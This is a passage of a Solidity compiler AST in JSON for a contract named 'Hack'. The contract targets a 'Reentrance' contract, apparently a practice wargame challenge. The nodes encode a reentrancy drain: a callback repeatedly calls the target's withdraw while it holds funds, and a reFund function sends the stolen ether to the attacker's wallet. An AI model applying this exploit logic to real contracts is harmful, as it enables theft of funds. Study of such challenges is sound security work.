																			"nodeType": "Identifier",
																			"overloadedDeclarations": [],
																			"referencedDeclaration": -28,
																			"src": "1237:4:1",
																			"typeDescriptions": {
																				"typeIdentifier": "t_contract$_Hack_$576",
																				"typeString": "contract Hack"
																			}
																		}
																	],
																	"expression": {
																		"argumentTypes": [
																			{
																				"typeIdentifier": "t_contract$_Hack_$576",
																				"typeString": "contract Hack"
																			}
																		],
																		"id": 476,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": true,
																		"lValueRequested": false,
																		"nodeType": "ElementaryTypeNameExpression",
																		"src": "1229:7:1",
																		"typeDescriptions": {
																			"typeIdentifier": "t_type$_t_address_$",
																			"typeString": "type(address)"
																		},
																		"typeName": {
																			"id": 475,
																			"name": "address",
																			"nodeType": "ElementaryTypeName",
																			"src": "1229:7:1",
																			"typeDescriptions": {
																				"typeIdentifier": null,
																				"typeString": null
																			}
																		}
																	},
																	"id": 478,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"kind": "typeConversion",
																	"lValueRequested": false,
																	"names": [],
																	"nodeType": "FunctionCall",
																	"src": "1229:13:1",
																	"tryCall": false,
																	"typeDescriptions": {
																		"typeIdentifier": "t_address_payable",
																		"typeString": "address payable"
																	}
																},
																"id": 479,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"memberName": "balance",
																"nodeType": "MemberAccess",
																"referencedDeclaration": null,
																"src": "1229:21:1",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": ">",
															"rightExpression": {
																"argumentTypes": null,
																"hexValue": "30",
																"id": 480,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "number",
																"lValueRequested": false,
																"nodeType": "Literal",
																"src": "1253:1:1",
																"subdenomination": null,
																"typeDescriptions": {
																	"typeIdentifier": "t_rational_0_by_1",
																	"typeString": "int_const 0"
																},
																"value": "0"
															},
															"src": "1229:25:1",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														],
														"id": 474,
														"name": "require",
														"nodeType": "Identifier",
														"overloadedDeclarations": [
															-18,
															-18
														],
														"referencedDeclaration": -18,
														"src": "1221:7:1",
														"typeDescriptions": {
															"typeIdentifier": "t_function_require_pure$_t_bool_$returns$__$",
															"typeString": "function (bool) pure"
														}
													},
													"id": 482,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "1221:34:1",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 483,
												"nodeType": "ExpressionStatement",
												"src": "1221:34:1"
											},
											{
												"assignments": [
													485,
													null
												],
												"declarations": [
													{
														"constant": false,
														"id": 485,
														"mutability": "mutable",
														"name": "success",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 505,
														"src": "1267:12:1",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_bool",
															"typeString": "bool"
														},
														"typeName": {
															"id": 484,
															"name": "bool",
															"nodeType": "ElementaryTypeName",
															"src": "1267:4:1",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														},
														"value": null,
														"visibility": "internal"
													},
													null
												],
												"id": 499,
												"initialValue": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"hexValue": "",
															"id": 497,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "string",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "1337:2:1",
															"subdenomination": null,
															"typeDescriptions": {
																"typeIdentifier": "t_stringliteral_c5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470",
																"typeString": "literal_string \"\""
															},
															"value": ""
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_stringliteral_c5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470",
																"typeString": "literal_string \"\""
															}
														],
														"expression": {
															"argumentTypes": [
																{
																	"typeIdentifier": "t_stringliteral_c5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470",
																	"typeString": "literal_string \"\""
																}
															],
															"expression": {
																"argumentTypes": null,
																"arguments": [
																	{
																		"argumentTypes": null,
																		"id": 488,
																		"name": "myWallet",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 471,
																		"src": "1292:8:1",
																		"typeDescriptions": {
																			"typeIdentifier": "t_address_payable",
																			"typeString": "address payable"
																		}
																	}
																],
																"expression": {
																	"argumentTypes": [
																		{
																			"typeIdentifier": "t_address_payable",
																			"typeString": "address payable"
																		}
																	],
																	"id": 487,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"lValueRequested": false,
																	"nodeType": "ElementaryTypeNameExpression",
																	"src": "1284:8:1",
																	"typeDescriptions": {
																		"typeIdentifier": "t_type$_t_address_payable_$",
																		"typeString": "type(address payable)"
																	},
																	"typeName": {
																		"id": 486,
																		"name": "address",
																		"nodeType": "ElementaryTypeName",
																		"src": "1284:8:1",
																		"stateMutability": "payable",
																		"typeDescriptions": {
																			"typeIdentifier": null,
																			"typeString": null
																		}
																	}
																},
																"id": 489,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"kind": "typeConversion",
																"lValueRequested": false,
																"names": [],
																"nodeType": "FunctionCall",
																"src": "1284:17:1",
																"tryCall": false,
																"typeDescriptions": {
																	"typeIdentifier": "t_address_payable",
																	"typeString": "address payable"
																}
															},
															"id": 490,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"memberName": "call",
															"nodeType": "MemberAccess",
															"referencedDeclaration": null,
															"src": "1284:22:1",
															"typeDescriptions": {
																"typeIdentifier": "t_function_barecall_payable$_t_bytes_memory_ptr_$returns$_t_bool_$_t_bytes_memory_ptr_$",
																"typeString": "function (bytes memory) payable returns (bool,bytes memory)"
															}
														},
														"id": 496,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"names": [
															"value"
														],
														"nodeType": "FunctionCallOptions",
														"options": [
															{
																"argumentTypes": null,
																"expression": {
																	"argumentTypes": null,
																	"arguments": [
																		{
																			"argumentTypes": null,
																			"id": 493,
																			"name": "this",
																			"nodeType": "Identifier",
																			"overloadedDeclarations": [],
																			"referencedDeclaration": -28,
																			"src": "1322:4:1",
																			"typeDescriptions": {
																				"typeIdentifier": "t_contract$_Hack_$576",
																				"typeString": "contract Hack"
																			}
																		}
																	],
																	"expression": {
																		"argumentTypes": [
																			{
																				"typeIdentifier": "t_contract$_Hack_$576",
																				"typeString": "contract Hack"
																			}
																		],
																		"id": 492,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": true,
																		"lValueRequested": false,
																		"nodeType": "ElementaryTypeNameExpression",
																		"src": "1314:7:1",
																		"typeDescriptions": {
																			"typeIdentifier": "t_type$_t_address_$",
																			"typeString": "type(address)"
																		},
																		"typeName": {
																			"id": 491,
																			"name": "address",
																			"nodeType": "ElementaryTypeName",
																			"src": "1314:7:1",
																			"typeDescriptions": {
																				"typeIdentifier": null,
																				"typeString": null
																			}
																		}
																	},
																	"id": 494,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"kind": "typeConversion",
																	"lValueRequested": false,
																	"names": [],
																	"nodeType": "FunctionCall",
																	"src": "1314:13:1",
																	"tryCall": false,
																	"typeDescriptions": {
																		"typeIdentifier": "t_address_payable",
																		"typeString": "address payable"
																	}
																},
																"id": 495,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"memberName": "balance",
																"nodeType": "MemberAccess",
																"referencedDeclaration": null,
																"src": "1314:21:1",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															}
														],
														"src": "1284:52:1",
														"typeDescriptions": {
															"typeIdentifier": "t_function_barecall_payable$_t_bytes_memory_ptr_$returns$_t_bool_$_t_bytes_memory_ptr_$value",
															"typeString": "function (bytes memory) payable returns (bool,bytes memory)"
														}
													},
													"id": 498,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "1284:56:1",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$_t_bool_$_t_bytes_memory_ptr_$",
														"typeString": "tuple(bool,bytes memory)"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "1266:74:1"
											},
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"id": 501,
															"name": "success",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 485,
															"src": "1360:7:1",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														},
														{
															"argumentTypes": null,
															"hexValue": "726546756e64206661696c6564",
															"id": 502,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "string",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "1368:15:1",
															"subdenomination": null,
															"typeDescriptions": {
																"typeIdentifier": "t_stringliteral_f411424153f64182427ade4d86d6af26de15d971896ecacc5dfbea789f29d97a",
																"typeString": "literal_string \"reFund failed\""
															},
															"value": "reFund failed"
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															},
															{
																"typeIdentifier": "t_stringliteral_f411424153f64182427ade4d86d6af26de15d971896ecacc5dfbea789f29d97a",
																"typeString": "literal_string \"reFund failed\""
															}
														],
														"id": 500,
														"name": "require",
														"nodeType": "Identifier",
														"overloadedDeclarations": [
															-18,
															-18
														],
														"referencedDeclaration": -18,
														"src": "1351:7:1",
														"typeDescriptions": {
															"typeIdentifier": "t_function_require_pure$_t_bool_$_t_string_memory_ptr_$returns$__$",
															"typeString": "function (bool,string memory) pure"
														}
													},
													"id": 503,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "1351:33:1",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 504,
												"nodeType": "ExpressionStatement",
												"src": "1351:33:1"
											}
										]
									},
									"documentation": null,
									"functionSelector": "0ff0a4df",
									"id": 506,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "reFund",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 468,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "1112:2:1"
									},
									"returnParameters": {
										"id": 469,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "1130:0:1"
									},
									"scope": 576,
									"src": "1097:295:1",
									"stateMutability": "payable",
									"virtual": false,
									"visibility": "public"
								},
								{
									"body": {
										"id": 519,
										"nodeType": "Block",
										"src": "1450:53:1",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"arguments": [
																{
																	"argumentTypes": null,
																	"id": 515,
																	"name": "this",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": -28,
																	"src": "1489:4:1",
																	"typeDescriptions": {
																		"typeIdentifier": "t_contract$_Hack_$576",
																		"typeString": "contract Hack"
																	}
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_contract$_Hack_$576",
																		"typeString": "contract Hack"
																	}
																],
																"id": 514,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"lValueRequested": false,
																"nodeType": "ElementaryTypeNameExpression",
																"src": "1481:7:1",
																"typeDescriptions": {
																	"typeIdentifier": "t_type$_t_address_$",
																	"typeString": "type(address)"
																},
																"typeName": {
																	"id": 513,
																	"name": "address",
																	"nodeType": "ElementaryTypeName",
																	"src": "1481:7:1",
																	"typeDescriptions": {
																		"typeIdentifier": null,
																		"typeString": null
																	}
																}
															},
															"id": 516,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "typeConversion",
															"lValueRequested": false,
															"names": [],
															"nodeType": "FunctionCall",
															"src": "1481:13:1",
															"tryCall": false,
															"typeDescriptions": {
																"typeIdentifier": "t_address_payable",
																"typeString": "address payable"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_address_payable",
																"typeString": "address payable"
															}
														],
														"expression": {
															"argumentTypes": null,
															"id": 511,
															"name": "re",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 446,
															"src": "1468:2:1",
															"typeDescriptions": {
																"typeIdentifier": "t_contract$_Reentrance_$435",
																"typeString": "contract Reentrance"
															}
														},
														"id": 512,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"memberName": "balanceOf",
														"nodeType": "MemberAccess",
														"referencedDeclaration": 394,
														"src": "1468:12:1",
														"typeDescriptions": {
															"typeIdentifier": "t_function_external_view$_t_address_$returns$_t_uint256_$",
															"typeString": "function (address) view external returns (uint256)"
														}
													},
													"id": 517,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "1468:27:1",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"functionReturnParameters": 510,
												"id": 518,
												"nodeType": "Return",
												"src": "1461:34:1"
											}
										]
									},
									"documentation": null,
									"functionSelector": "12065fe0",
									"id": 520,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "getBalance",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 507,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "1419:2:1"
									},
									"returnParameters": {
										"id": 510,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 509,
												"mutability": "mutable",
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 520,
												"src": "1442:7:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 508,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "1442:7:1",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "1441:9:1"
									},
									"scope": 576,
									"src": "1400:103:1",
									"stateMutability": "view",
									"virtual": false,
									"visibility": "public"
								},
								{
									"body": {
										"id": 531,
										"nodeType": "Block",
										"src": "1563:47:1",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"expression": {
														"argumentTypes": null,
														"arguments": [
															{
																"argumentTypes": null,
																"id": 527,
																"name": "this",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": -28,
																"src": "1589:4:1",
																"typeDescriptions": {
																	"typeIdentifier": "t_contract$_Hack_$576",
																	"typeString": "contract Hack"
																}
															}
														],
														"expression": {
															"argumentTypes": [
																{
																	"typeIdentifier": "t_contract$_Hack_$576",
																	"typeString": "contract Hack"
																}
															],
															"id": 526,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"lValueRequested": false,
															"nodeType": "ElementaryTypeNameExpression",
															"src": "1581:7:1",
															"typeDescriptions": {
																"typeIdentifier": "t_type$_t_address_$",
																"typeString": "type(address)"
															},
															"typeName": {
																"id": 525,
																"name": "address",
																"nodeType": "ElementaryTypeName",
																"src": "1581:7:1",
																"typeDescriptions": {
																	"typeIdentifier": null,
																	"typeString": null
																}
															}
														},
														"id": 528,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"kind": "typeConversion",
														"lValueRequested": false,
														"names": [],
														"nodeType": "FunctionCall",
														"src": "1581:13:1",
														"tryCall": false,
														"typeDescriptions": {
															"typeIdentifier": "t_address_payable",
															"typeString": "address payable"
														}
													},
													"id": 529,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"memberName": "balance",
													"nodeType": "MemberAccess",
													"referencedDeclaration": null,
													"src": "1581:21:1",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"functionReturnParameters": 524,
												"id": 530,
												"nodeType": "Return",
												"src": "1574:28:1"
											}
										]
									},
									"documentation": null,
									"functionSelector": "087d01df",
									"id": 532,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "getEthAmount",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 521,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "1532:2:1"
									},
									"returnParameters": {
										"id": 524,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 523,
												"mutability": "mutable",
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 532,
												"src": "1555:7:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 522,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "1555:7:1",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "1554:9:1"
									},
									"scope": 576,
									"src": "1511:99:1",
									"stateMutability": "view",
									"virtual": false,
									"visibility": "public"
								},
								{
									"body": {
										"id": 574,
										"nodeType": "Block",
										"src": "1652:274:1",
										"statements": [
											{
												"assignments": [
													536
												],
												"declarations": [
													{
														"constant": false,
														"id": 536,
														"mutability": "mutable",
														"name": "bal",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 574,
														"src": "1663:11:1",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 535,
															"name": "uint256",
															"nodeType": "ElementaryTypeName",
															"src": "1663:7:1",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 544,
												"initialValue": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"arguments": [
																{
																	"argumentTypes": null,
																	"id": 541,
																	"name": "this",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": -28,
																	"src": "1698:4:1",
																	"typeDescriptions": {
																		"typeIdentifier": "t_contract$_Hack_$576",
																		"typeString": "contract Hack"
																	}
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_contract$_Hack_$576",
																		"typeString": "contract Hack"
																	}
																],
																"id": 540,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"lValueRequested": false,
																"nodeType": "ElementaryTypeNameExpression",
																"src": "1690:7:1",
																"typeDescriptions": {
																	"typeIdentifier": "t_type$_t_address_$",
																	"typeString": "type(address)"
																},
																"typeName": {
																	"id": 539,
																	"name": "address",
																	"nodeType": "ElementaryTypeName",
																	"src": "1690:7:1",
																	"typeDescriptions": {
																		"typeIdentifier": null,
																		"typeString": null
																	}
																}
															},
															"id": 542,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "typeConversion",
															"lValueRequested": false,
															"names": [],
															"nodeType": "FunctionCall",
															"src": "1690:13:1",
															"tryCall": false,
															"typeDescriptions": {
																"typeIdentifier": "t_address_payable",
																"typeString": "address payable"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_address_payable",
																"typeString": "address payable"
															}
														],
														"expression": {
															"argumentTypes": null,
															"id": 537,
															"name": "re",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 446,
															"src": "1677:2:1",
															"typeDescriptions": {
																"typeIdentifier": "t_contract$_Reentrance_$435",
																"typeString": "contract Reentrance"
															}
														},
														"id": 538,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"memberName": "balanceOf",
														"nodeType": "MemberAccess",
														"referencedDeclaration": 394,
														"src": "1677:12:1",
														"typeDescriptions": {
															"typeIdentifier": "t_function_external_view$_t_address_$returns$_t_uint256_$",
															"typeString": "function (address) view external returns (uint256)"
														}
													},
													"id": 543,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "1677:27:1",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "1663:41:1"
											},
											{
												"condition": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 547,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"id": 545,
														"name": "bal",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 536,
														"src": "1719:3:1",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": ">",
													"rightExpression": {
														"argumentTypes": null,
														"hexValue": "30",
														"id": 546,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"kind": "number",
														"lValueRequested": false,
														"nodeType": "Literal",
														"src": "1725:1:1",
														"subdenomination": null,
														"typeDescriptions": {
															"typeIdentifier": "t_rational_0_by_1",
															"typeString": "int_const 0"
														},
														"value": "0"
													},
													"src": "1719:7:1",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"falseBody": null,
												"id": 573,
												"nodeType": "IfStatement",
												"src": "1715:204:1",
												"trueBody": {
													"id": 572,
													"nodeType": "Block",
													"src": "1728:191:1",
													"statements": [
														{
															"condition": {
																"argumentTypes": null,
																"commonType": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																},
																"id": 554,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftExpression": {
																	"argumentTypes": null,
																	"expression": {
																		"argumentTypes": null,
																		"arguments": [
																			{
																				"argumentTypes": null,
																				"id": 550,
																				"name": "target",
																				"nodeType": "Identifier",
																				"overloadedDeclarations": [],
																				"referencedDeclaration": 441,
																				"src": "1754:6:1",
																				"typeDescriptions": {
																					"typeIdentifier": "t_address_payable",
																					"typeString": "address payable"
																				}
																			}
																		],
																		"expression": {
																			"argumentTypes": [
																				{
																					"typeIdentifier": "t_address_payable",
																					"typeString": "address payable"
																				}
																			],
																			"id": 549,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": true,
																			"lValueRequested": false,
																			"nodeType": "ElementaryTypeNameExpression",
																			"src": "1746:7:1",
																			"typeDescriptions": {
																				"typeIdentifier": "t_type$_t_address_$",
																				"typeString": "type(address)"
																			},
																			"typeName": {
																				"id": 548,
																				"name": "address",
																				"nodeType": "ElementaryTypeName",
																				"src": "1746:7:1",
																				"typeDescriptions": {
																					"typeIdentifier": null,
																					"typeString": null
																				}
																			}
																		},
																		"id": 551,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": false,
																		"kind": "typeConversion",
																		"lValueRequested": false,
																		"names": [],
																		"nodeType": "FunctionCall",
																		"src": "1746:15:1",
																		"tryCall": false,
																		"typeDescriptions": {
																			"typeIdentifier": "t_address",
																			"typeString": "address"
																		}
																	},
																	"id": 552,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"lValueRequested": false,
																	"memberName": "balance",
																	"nodeType": "MemberAccess",
																	"referencedDeclaration": null,
																	"src": "1746:23:1",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"nodeType": "BinaryOperation",
																"operator": ">",
																"rightExpression": {
																	"argumentTypes": null,
																	"hexValue": "313030303030303030303030303030",
																	"id": 553,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"kind": "number",
																	"lValueRequested": false,
																	"nodeType": "Literal",
																	"src": "1772:15:1",
																	"subdenomination": null,
																	"typeDescriptions": {
																		"typeIdentifier": "t_rational_100000000000000_by_1",
																		"typeString": "int_const 100000000000000"
																	},
																	"value": "100000000000000"
																},
																"src": "1746:41:1",
																"typeDescriptions": {
																	"typeIdentifier": "t_bool",
																	"typeString": "bool"
																}
															},
															"falseBody": {
																"expression": {
																	"argumentTypes": null,
																	"arguments": [
																		{
																			"argumentTypes": null,
																			"expression": {
																				"argumentTypes": null,
																				"arguments": [
																					{
																						"argumentTypes": null,
																						"id": 566,
																						"name": "target",
																						"nodeType": "Identifier",
																						"overloadedDeclarations": [],
																						"referencedDeclaration": 441,
																						"src": "1891:6:1",
																						"typeDescriptions": {
																							"typeIdentifier": "t_address_payable",
																							"typeString": "address payable"
																						}
																					}
																				],
																				"expression": {
																					"argumentTypes": [
																						{
																							"typeIdentifier": "t_address_payable",
																							"typeString": "address payable"
																						}
																					],
																					"id": 565,
																					"isConstant": false,
																					"isLValue": false,
																					"isPure": true,
																					"lValueRequested": false,
																					"nodeType": "ElementaryTypeNameExpression",
																					"src": "1883:7:1",
																					"typeDescriptions": {
																						"typeIdentifier": "t_type$_t_address_$",
																						"typeString": "type(address)"
																					},
																					"typeName": {
																						"id": 564,
																						"name": "address",
																						"nodeType": "ElementaryTypeName",
																						"src": "1883:7:1",
																						"typeDescriptions": {
																							"typeIdentifier": null,
																							"typeString": null
																						}
																					}
																				},
																				"id": 567,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": false,
																				"kind": "typeConversion",
																				"lValueRequested": false,
																				"names": [],
																				"nodeType": "FunctionCall",
																				"src": "1883:15:1",
																				"tryCall": false,
																				"typeDescriptions": {
																					"typeIdentifier": "t_address",
																					"typeString": "address"
																				}
																			},
																			"id": 568,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"lValueRequested": false,
																			"memberName": "balance",
																			"nodeType": "MemberAccess",
																			"referencedDeclaration": null,
																			"src": "1883:23:1",
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			}
																		}
																	],
																	"expression": {
																		"argumentTypes": [
																			{
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			}
																		],
																		"expression": {
																			"argumentTypes": null,
																			"id": 561,
																			"name": "re",
																			"nodeType": "Identifier",
																			"overloadedDeclarations": [],
																			"referencedDeclaration": 446,
																			"src": "1871:2:1",
																			"typeDescriptions": {
																				"typeIdentifier": "t_contract$_Reentrance_$435",
																				"typeString": "contract Reentrance"
																			}
																		},
																		"id": 563,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": false,
																		"lValueRequested": false,
																		"memberName": "withdraw",
																		"nodeType": "MemberAccess",
																		"referencedDeclaration": 430,
																		"src": "1871:11:1",
																		"typeDescriptions": {
																			"typeIdentifier": "t_function_external_nonpayable$_t_uint256_$returns$__$",
																			"typeString": "function (uint256) external"
																		}
																	},
																	"id": 569,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"kind": "functionCall",
																	"lValueRequested": false,
																	"names": [],
																	"nodeType": "FunctionCall",
																	"src": "1871:36:1",
																	"tryCall": false,
																	"typeDescriptions": {
																		"typeIdentifier": "t_tuple$__$",
																		"typeString": "tuple()"
																	}
																},
																"id": 570,
																"nodeType": "ExpressionStatement",
																"src": "1871:36:1"
															},
															"id": 571,
															"nodeType": "IfStatement",
															"src": "1743:164:1",
															"trueBody": {
																"expression": {
																	"argumentTypes": null,
																	"arguments": [
																		{
																			"argumentTypes": null,
																			"hexValue": "313030303030303030303030303030",
																			"id": 558,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": true,
																			"kind": "number",
																			"lValueRequested": false,
																			"nodeType": "Literal",
																			"src": "1818:15:1",
																			"subdenomination": null,
																			"typeDescriptions": {
																				"typeIdentifier": "t_rational_100000000000000_by_1",
																				"typeString": "int_const 100000000000000"
																			},
																			"value": "100000000000000"
																		}
																	],
																	"expression": {
																		"argumentTypes": [
																			{
																				"typeIdentifier": "t_rational_100000000000000_by_1",
																				"typeString": "int_const 100000000000000"
																			}
																		],
																		"expression": {
																			"argumentTypes": null,
																			"id": 555,
																			"name": "re",
																			"nodeType": "Identifier",
																			"overloadedDeclarations": [],
																			"referencedDeclaration": 446,
																			"src": "1806:2:1",
																			"typeDescriptions": {
																				"typeIdentifier": "t_contract$_Reentrance_$435",
																				"typeString": "contract Reentrance"
																			}
																		},
																		"id": 557,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": false,
																		"lValueRequested": false,
																		"memberName": "withdraw",
																		"nodeType": "MemberAccess",
																		"referencedDeclaration": 430,
																		"src": "1806:11:1",
																		"typeDescriptions": {
																			"typeIdentifier": "t_function_external_nonpayable$_t_uint256_$returns$__$",
																			"typeString": "function (uint256) external"
																		}
																	},
																	"id": 559,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"kind": "functionCall",
																	"lValueRequested": false,
																	"names": [],
																	"nodeType": "FunctionCall",
																	"src": "1806:28:1",
																	"tryCall": false,
																	"typeDescriptions": {
																		"typeIdentifier": "t_tuple$__$",
